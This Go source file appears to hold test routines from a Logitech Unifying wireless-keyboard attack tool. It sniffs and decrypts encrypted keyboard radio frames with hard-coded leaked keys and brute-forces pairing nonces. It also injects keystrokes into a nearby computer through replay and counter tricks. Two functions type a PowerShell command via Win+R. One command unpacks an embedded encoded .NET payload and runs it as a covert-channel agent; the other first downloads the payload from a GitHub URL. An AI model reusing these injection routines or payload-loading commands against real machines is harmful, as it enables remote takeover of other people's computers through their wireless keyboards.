	//plain: 04 14 1d 1f 27 28 0d 8c c3 7b aa 0a 0d 13 26 0e  <-- indata unchanged for newly paired device (same hardware)
	//key new:   02 7d 77 07 34 65 99 ee e3 88 80 11 38 4e 20 83
	//key old:   02 7d 77 07 af 65 17 0d 30 88 d9 11 7f 99 20 3d
	//changed:               xx    xx xx xx    xx    xx xx    xx

	keyb := Device{
		addr: unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0xfa},
	}
	for o := 16; o < 0x100; o ++ {
		keyb.addr[4] = byte(o)
		kc, ferr := keyb.FindCurrentChannel(nrf24)
		if ferr == nil {
			fmt.Printf("Found keyboard %s on %d\n", keyb.AddrStr(), kc)
		} else {
			fmt.Println("Keyboard not found", keyb.AddrStr())
			continue
		}
		fmt.Println("Sniffing keyboard")
		//keyb.Sniff(nrf24, context.Background())

		for {
			p, e := nrf24.ReceivePayload() //try to read an ACK payload (or other traffic for the address, which we aren't interested in)
			if e == nil {
				if len(p) > 1 && p[0] == 0x00 { //Successful receive
					pay := p[1:] //Remove first byte, as it indicates success/error of read call
					//if pay[1] == 0x0e {

					//try to decrypt
					decrypted, decErr := DecryptFrame(keyDump, plainDump, pay)
					if decErr == nil {
						fmt.Printf("Sniff %s (raw): % #x\n", keyb.AddrStr(), pay)
						fmt.Printf("DECRYPTED: % x\n", decrypted[:7])
					}
				}
			}
		}

	}
	return

}

func TestInjectEncryptedRFFramesEmulateKeyboard(nrf24 *unifying.NRF24, addr unifying.Nrf24Addr) {
	key := Device{
		addr: addr,
	}

	for {
		kc, ferr := key.FindCurrentChannel(nrf24)
		if ferr == nil {
			fmt.Printf("Found keyboard %s on %d\n", key.AddrStr(), kc)
			break
		} else {
			fmt.Printf(".")
			continue
		}
		fmt.Println("Sniffing keyboard")

	}

	//	l2 := Logitech2{}

	//Keyboard uses 0x77, 0x82, 0x9a, 0x07, 0x16

	//0x81e0 Leaked key for paired keyboard   02:7d:77:07:af:65:17:0d:30:88:d9:11:7f:99:20:3d
	//0x8311 Leaked plain for paired keyboard 04:14:1d:1f:27:28:0d:df:7c:2d:eb:0a:0d:13:26:e0 //df:7c:2d:eb is counter and thus changing

	//Resulting cipher similar to:     21:20:d5:af:5c:5f:e9:e1:xx:xx:xx:xx:xx:xx:xx:xx

	nrf24.EnterSnifferMode(key.addr, true)

	pays := make([][]byte, 0)
	//	pays = append(pays, []byte{0x00, 0xd3, 0x21, 0x1f, 0xc2, 0xcc, 0xdd, 0x44, 0x2c, 0x1a, 0x44, 0x6a, 0xc0, 0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9})
	// Result for packing r1,r2,r3: 20010112 e0 cd 01 0000000000000000
	// on call to 0x516d r1 = 0xe0, r2 = 0x81 r3 = 0x01
	//	pays = append(pays, []byte{0x00, 0xd3, 0xf9, 0xf3, 0x2f, 0x41, 0x96, 0xa4, 0x40, 0xa9, 0xdf, 0x7c, 0x2d, 0xea, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c})
	// on call to 0x516d r1 = 0xe0, r2 = 0x81 r3 = 0x01
	// pays = append(pays, []byte{0x00, 0xd3, 0x21, 0x20, 0xd5, 0xaf, 0x5c, 0x5f, 0xe9, 0xe1, 0xdf, 0x7c, 0x2d, 0xeb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70})
	// on call to 0x516d r1 = 0xe0, r2 = 0x81 r3 = 0x01
	//	pays = append(pays, []byte{0x00, 0xd3, 0x95, 0x8e, 0xb4, 0x59, 0x0a, 0x64, 0xf6, 0xc2, 0xdf, 0x7c, 0x2d, 0xec, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63})
	// on call to 0x516d r1 = 0xe0, r2 = 0x81 r3 = 0x01

	pays = append(pays, []byte{0x00, 0xd3, 0xb9, 0x0f, 0xde, 0x13, 0xc0, 0xe4, 0x32, 0xc3, 0x8c, 0xc3, 0x7b, 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67})

	/*
00001482: 0000 0000 0000 0020 0101 0ae0 4001 00  ....... ....@..
00001491: 0000 0000 0000 0020 0101 2de0 ae01 00  ....... ..-....
000014a0: 0000 0000 0000 0020 0101 1be0 5801 00  ....... ....X..
000014af: 0000 0000 0000 0020 0101 12e0 cd01 00  ....... .......
000014be: 0000 0000 0000 0020 0101 0ae0 4001 00  ....... ....@..
000014cd: 0000 0000 0000 0020 0101 2de0 ae01 00  ....... ..-....
000014dc: 0000 0000 0000 0020 0101 1be0 5801 00  ....... ....X..
000014eb: 0000 0000 0000 0020 0101 12e0 cd01 00  ....... .......

	 */

	//	pays = append(pays, []byte{0x00, 0x40, 0x01, 0x16, 0xa9, 0x00, 0x00, 0x00, 0x00, 0x9a, 0x44, 0x6a, 0xc0, 0xa2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x42})

	lp := len(pays)
	currentPay := 0
	for {
		pay := pays[currentPay]
		currentPay++
		currentPay %= lp
		unifying.LogitechChecksum(pay)
		rsp, err := nrf24.TransmitPayload(pay, 4, 15)
		if err == nil {
			if len(rsp) > 0 {
				fmt.Printf("Rsp: % x\n", rsp)

			}
		} else {
			for {
				_, ferr := key.FindCurrentChannel(nrf24)
				if ferr == nil {
					//fmt.Printf("Found keyboard %s on %d\n", key.AddrStr(), kc)
					break
				} else {
					fmt.Printf(".")
					continue
				}
				fmt.Println("Sniffing keyboard")
			}

		}

		time.Sleep(8 * time.Millisecond)
	}

}

func BruteForceKeyNaive(frame []byte, dongleSerial []byte, deviceWPID []byte, dongleWPID []byte) (result []byte, err error) {

	aesin := []byte{0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d, 0xdf, 0x7c, 0x2d, 0xeb, 0x0a, 0x0d, 0x13, 0x26, 0x0e}

	eNoCryptFrame := errors.New("no encrypted frame")
	if len(frame) != 22 {
		err = eNoCryptFrame
		return
	}

	if frame[1] != 0xd3 { //only known report ID so far
		err = eNoCryptFrame
		return
	}

	cryptPay := make([]byte, 8)
	copy(cryptPay, frame[2:])

	counter := frame[10:14]
	copy(aesin[7:], counter) //update counter
	keyguess := make([]byte, 16)
	devNonceByte := make([]byte, 4)
	dongleNonceByte := make([]byte, 4)

	decrypt := make([]byte, 8)

	start := time.Now()
	for devNonce := 0; devNonce < 0x100000000; devNonce++ {
		for dongleNonce := 0; dongleNonce < 0x100000000; dongleNonce++ {
			devNonceByte[0] = byte((devNonce & 0xff000000) >> 24)
			devNonceByte[1] = byte((devNonce & 0x00ff0000) >> 16)
			devNonceByte[2] = byte((devNonce & 0x0000ff00) >> 8)
			devNonceByte[3] = byte(devNonce & 0x000000ff)
			dongleNonceByte[0] = byte((devNonce & 0xff000000) >> 24)
			dongleNonceByte[1] = byte((devNonce & 0x00ff0000) >> 16)
			dongleNonceByte[2] = byte((devNonce & 0x0000ff00) >> 8)
			dongleNonceByte[3] = byte(devNonce & 0x000000ff)
			keyguess = unifying.CalculateLinkKey(dongleSerial, deviceWPID, dongleWPID, devNonceByte, dongleNonceByte)

			cipher := unifying.EncryptAes128Ecb(aesin, keyguess)[0:8]

			//check
			for idx, cipher_byte := range cipher {
				decrypt[idx] = cipher_byte ^ cryptPay[idx]
			}

			if decrypt[5] == 0x00 && decrypt[6] == 0x00 {
				fmt.Printf("Candidate devNonce % 02x dongle nonce % 02x decrypt % #02x\n", devNonceByte, dongleNonceByte, decrypt)
				fmt.Printf("Key used: % 02x\n", keyguess)
			}

			if dongleNonce&0x00ffffff == 0 {
				fmt.Printf("New dongle nonce %08x after %v\n", dongleNonce, time.Since(start))
			}
		}

		fmt.Printf("New device nonce %08x after %v\n", devNonce, time.Since(start))
	}

	return keyguess, nil
}

func TestPairSniff(debug bool) {
	lt, _ := unifying.NewLogitacker()
	//Sniff pairing test
	_, dev, err := lt.SniffPairing(debug)
	//Sniff device test
	if err == nil {
		//if sniffing of pairing succeeded continue sniffing device (only encrypted keyboard reports and LED reports)
		lt.SniffDeviceKeybuff(context.Background(), dev, false, []unifying.RFFrameType{unifying.FT_KEYBOARD_ENCRYPTED, unifying.FT_LED_REPORT})
	} else {
		//if sniffing of pairing failed, wait till a device address is discovered and sniff all frames of this device
		newdev, _ := lt.SnoopForDeviceAddress(context.Background(), 20*time.Millisecond)
		fmt.Printf("Start sniffing: %s...\n", newdev.RfAddress.String())
		lt.SniffDevice(context.Background(), newdev, true, []unifying.RFFrameType{})
	}

}

func TestUnknownSniff() {
	lt,eLt := unifying.NewLogitacker()
	if eLt != nil {
		panic(eLt)
	}

	newdev, _ := lt.SnoopForDeviceAddress(context.Background(), 20*time.Millisecond)
	fmt.Printf("Start sniffing: %s...\n", newdev.RfAddress.String())
	lt.SniffDevice(context.Background(), newdev, true, []unifying.RFFrameType{unifying.FT_INVALID_CHKSM, unifying.FT_NOTIFICATION_KEEP_ALIVE})

}

// Manual injection of encrypted keyboard reports for
// - RF address 77:82:9a:07:bc
// - linke encryption key: 027d77074b65c2d13588834d57d84009
func TestKeystrokeInjection() {
	lt, _ := unifying.NewLogitacker()

	knownDev := &unifying.LogitackerDevice{}
	//knownDev.RfAddress = Nrf24Addr{0xe2, 0xc7, 0x94, 0xf2, 0x35}
	knownDev.RfAddress = unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0xbc}
	//knownDev.SetKey([]byte{0x08, 0x38, 0xe2, 0xf2, 0x50, 0x6b, 0x13, 0x02, 0x91, 0x88, 0x7a, 0x4d, 0xcb, 0xb9, 0x40, 0xe1})
	knownDev.SetKey([]byte{0x02, 0x7d, 0x77, 0x07, 0x4b, 0x65, 0xc2, 0xd1, 0x35, 0x88, 0x83, 0x4d, 0x57, 0xd8, 0x40, 0x09})
	//Note:
	// a new counter has to "over roll" stored counters of real device for injection or continue from a sniffed counter
	// The counter is storage is overwritten after about 23 reports (could be empty) the real device has to send the
	// same number of reports to work again with its own counter
	knownDev.Counter = rand2.Uint32()

	reports := make([]unifying.LogitackerUnecryptedKeyboardReport, 0)
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{0x02, 0x04}) //shift A
	//reports = append(reports, LogitackerUnecryptedKeyboardReport{}) // release
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{0x02, 0x05}) //shift B
	//reports = append(reports, LogitackerUnecryptedKeyboardReport{}) // release
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{0x02, 0x06}) //shift C
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{})           // release
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{0x00, 0x28}) //return
	reports = append(reports, unifying.LogitackerUnecryptedKeyboardReport{})           // release

	lt.RollOverCounterReuseCache(knownDev) //Assure the dongle forgets all counters used by the real device, so far

	for i := 0; i < 1000; i++ {
		lt.SendEncryptedReports(knownDev, reports)
		time.Sleep(time.Millisecond)
	}

}

func TestSniffExisting() {
	lt, err := unifying.NewLogitacker()
	if err != nil {
		panic(err)
	}

	knownDev := &unifying.LogitackerDevice{}
	//knownDev.RfAddress = Nrf24Addr{0xe2, 0xc7, 0x94, 0xf2, 0x35}
	//knownDev.RfAddress = Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0xbc}
	//knownDev.SetKey([]byte{0x08, 0x38, 0xe2, 0xf2, 0x50, 0x6b, 0x13, 0x02, 0x91, 0x88, 0x7a, 0x4d, 0xcb, 0xb9, 0x40, 0xe1})
	//knownDev.SetKey([]byte{0x02, 0x7d, 0x77, 0x07, 0x4b, 0x65, 0xc2, 0xd1, 0x35, 0x88, 0x83, 0x4d, 0x57, 0xd8, 0x40, 0x09})

	knownDev.RfAddress = unifying.Nrf24Addr{0xe2, 0xc7, 0x94, 0xf2, 0x4c}
	knownDev.SetKey([]byte{0x08, 0x38, 0xe2, 0xf2, 0xe4, 0x6b, 0x86, 0xa7, 0x75, 0x88, 0x17, 0x04, 0x8a, 0x35, 0x40, 0x8e})

	//lt.SniffDevice(context.Background(), knownDev, true, []RFFrameType{FT_NOTIFICATION_KEEP_ALIVE, FT_INVALID_CHKSM} )
	//lt.SniffDeviceKeybuff(context.Background(), knownDev, false, []RFFrameType{FT_KEYBOARD_ENCRYPTED, FT_LED_REPORT} )
	lt.SniffDeviceKeybuff(context.Background(), knownDev, true, []unifying.RFFrameType{unifying.FT_INVALID_CHKSM, unifying.FT_NOTIFICATION_KEEP_ALIVE})

	//lt.CaptureDevice(context.Background(), knownDev, false, []RFFrameType{FT_KEYBOARD_ENCRYPTED, FT_LED_REPORT}, CaptureCallbackPrint)

}

func TestSniffReplayXOR(debug bool, outstring string, languageLayout string) {
	lt,_ := unifying.NewLogitacker()

	newdev, _ := lt.SnoopForDeviceAddress(context.Background(), 20*time.Millisecond)

	for i:=0 ; i<20; i++ {
		lt.SniffReplayXORPress(newdev, debug, "", languageLayout) // first iteration captures attackable frames, all other send empty reports to flood counter
	}

	fmt.Println("injecting keystrokes (don't press further keys) ...")
	for i:=5;i>0;i-- {
		fmt.Printf("\tin %d ...", i)
		time.Sleep(time.Second)
	}


	lt.SniffReplayXORType(newdev, debug, outstring, languageLayout)
}

func TestSniffReplayXORCovertChannelAgent(debug bool, languageLayout string) {
	lt,_ := unifying.NewLogitacker()

	newdev, _ := lt.SnoopForDeviceAddress(context.Background(), 20*time.Millisecond)

	lt.SniffReplayXORType(newdev, debug, "", languageLayout) //tape nothing, only collect frames for XOR

	fmt.Println("Injecting keystrokes for covert channel agent in ...")
	for i:=5;i>0;i-- {
		fmt.Printf("\t%d ...", i)
		time.Sleep(time.Second)
	}

	lt.SniffReplayXORPress(newdev, debug, "GUI R", languageLayout)
	time.Sleep(time.Millisecond * 1000)
	lt.SniffReplayXORType(newdev, debug, "powershell\n", languageLayout)
	time.Sleep(time.Millisecond * 2000)
	agentString := "$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n"
	lt.SniffReplayXORType(newdev, debug, agentString, languageLayout)

	fmt.Println("Finished typing, launching covert channel server...")
	TestCovertChannel(newdev.RfAddress.String())

}

func TestSniffReplayXORCovertChannelAgent2(debug bool, languageLayout string) {
	lt,_ := unifying.NewLogitacker()

	newdev, _ := lt.SnoopForDeviceAddress(context.Background(), 20*time.Millisecond)

	lt.SniffReplayXORType(newdev, debug, "", languageLayout) //tape nothing, only collect frames for XOR

	fmt.Println("Injecting keystrokes for covert channel agent in ...")
	for i:=5;i>0;i-- {
		fmt.Printf("\t%d ...", i)
		time.Sleep(time.Second)
	}

	lt.SniffReplayXORPress(newdev, debug, "GUI R", languageLayout)
	time.Sleep(time.Millisecond * 1000)
	lt.SniffReplayXORType(newdev, debug, "powershell\n", languageLayout)
	time.Sleep(time.Millisecond * 2000)
	agentString := "nal no New-Object -F;$b=(no Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/mame82/tests/master/old/test2.b64\");$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n"
	lt.SniffReplayXORType(newdev, debug, agentString, languageLayout)

	fmt.Println("Finished typing, launching covert channel server...")
	TestCovertChannel(newdev.RfAddress.String())

}

func TestSniffReplay() {
	lt, _ := unifying.NewLogitacker()

	knownDev := &unifying.LogitackerDevice{}
	knownDev.RfAddress = unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0xbc}
	knownDev.SetKey([]byte{0x02, 0x7d, 0x77, 0x07, 0x4b, 0x65, 0xc2, 0xd1, 0x35, 0x88, 0x83, 0x4d, 0x57, 0xd8, 0x40, 0x09})

	lastType := unifying.FT_UNKNOWN
	lastPay := []byte{}
	lastTimeDelta := time.Duration(0)
	lastCounter := uint32(0)

	maxStore := 26
	storedCount := 0

	type reportEntry struct {
		dt  time.Duration
		rep []byte
	}
	storedReport := make([]reportEntry, maxStore)

	//reportEntries := [24]reportEntry{}
	callback := func(device *unifying.LogitackerDevice, frameTimeDuration time.Duration, pay []byte, class unifying.RFFrameType) (goOn bool) {
		//fmt.Printf("Pay (addr %s, len %d, ch %d, type: %s):\n\t % 02x\n", address, len(pay), ch, class, pay)
		///frameTime := frameTimeDuration.Nanoseconds()
